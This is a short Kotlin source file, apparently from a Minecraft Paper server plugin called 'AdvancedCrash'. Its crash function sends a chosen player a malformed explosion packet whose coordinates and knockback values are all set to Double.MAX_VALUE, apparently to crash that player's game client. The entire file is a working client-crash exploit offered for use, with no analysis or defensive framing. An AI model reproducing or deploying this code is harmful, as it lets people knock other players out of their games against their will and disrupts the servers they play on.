package io.github.runkang10.AdvancedCrash.paper.api

import net.minecraft.core.particles.ParticleTypes
import net.minecraft.network.protocol.game.ClientboundExplodePacket
import net.minecraft.server.level.ServerPlayer
import net.minecraft.sounds.SoundEvents
import net.minecraft.world.phys.Vec3
import org.bukkit.entity.Player
import java.util.*

class Crash private constructor() {
    companion object {
        fun crash(target: Player) {
            val craftPlayerClass = Class.forName("org.bukkit.craftbukkit.entity.CraftPlayer")
            val getHandle = craftPlayerClass.getMethod("getHandle")
            val ePlayer: ServerPlayer = getHandle.invoke(target) as ServerPlayer

            // Send packets
            ePlayer.connection.send(
                ClientboundExplodePacket(
                    Vec3(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE),
                    Optional.of(Vec3(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)),
                    ParticleTypes.EXPLOSION,
                    SoundEvents.GENERIC_EXPLODE
                )
            )
        }
    }
}
